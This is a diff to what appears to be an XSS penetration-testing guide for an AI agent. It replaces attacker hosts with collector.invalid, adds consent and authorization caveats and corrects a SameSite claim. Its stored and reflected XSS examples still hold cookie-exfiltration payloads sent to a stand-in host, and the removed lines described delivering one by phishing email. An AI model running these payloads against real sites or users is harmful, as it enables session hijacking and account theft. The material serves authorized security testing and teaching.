@@ -40,7 +40,7 @@ Read [the detailed guide](references/detailed-guide.md) before executing this sk
 ### Technical Limitations
 - Content Security Policy (CSP) may block inline scripts
 - HttpOnly cookies prevent JavaScript access
-- SameSite cookie attributes limit cross-origin attacks
+- SameSite limits some cross-site cookie sending; it does not prevent script running in the vulnerable origin from acting as that user
 - Modern frameworks often auto-escape outputs
 
 ### Legal and Ethical Requirements
@@ -69,11 +69,11 @@ Content-Type: application/json
 ```html
 <script>
 var i = new Image();
-i.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
+i.src = 'https://collector.invalid/steal?cookie=' + encodeURIComponent(document.cookie);
 </script>
 ```
 
-**Result**: Every user viewing the comment has their session cookie sent to attacker's server.
+**Result**: In a controlled browser, only non-HttpOnly cookies accessible to that document could be sent, and CSP/network policy may block the request. Do not test this with real sessions.
 
 ### Example 2: Reflected XSS via Search Parameter
 
@@ -91,10 +91,10 @@ https://shop.example.com/search?q=<script>alert(document.domain)</script>
 
 **Crafted Attack URL**:
 ```
-https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch('https://attacker.com/log?c='+document.cookie)%22%3E
+https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch('https://collector.invalid/log?c='+document.cookie)%22%3E
 ```
 
-**Delivery**: URL sent via phishing email to target user.
+**Delivery**: Open only in a consenting test account/browser; sending links to people requires separate explicit authorization.
 
 ### Example 3: DOM-Based XSS via Hash Fragment
 
@@ -102,12 +102,13 @@ https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch('https://att
 
 **Vulnerable Code**:
 ```javascript
-document.getElementById('welcome').innerHTML = 'Hello, ' + location.hash.slice(1);
+// Vulnerable teaching example: explicit decode introduces markup from an encoded hash.
+document.getElementById('welcome').innerHTML = 'Hello, ' + decodeURIComponent(location.hash.slice(1));
 ```
 
 **Attack URL**:
 ```
-https://app.example.com/dashboard#<img src=x onerror=alert(document.cookie)>
+https://app.example.com/dashboard#%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
 ```
 
 **Result**: Script executes entirely client-side; payload never touches server.
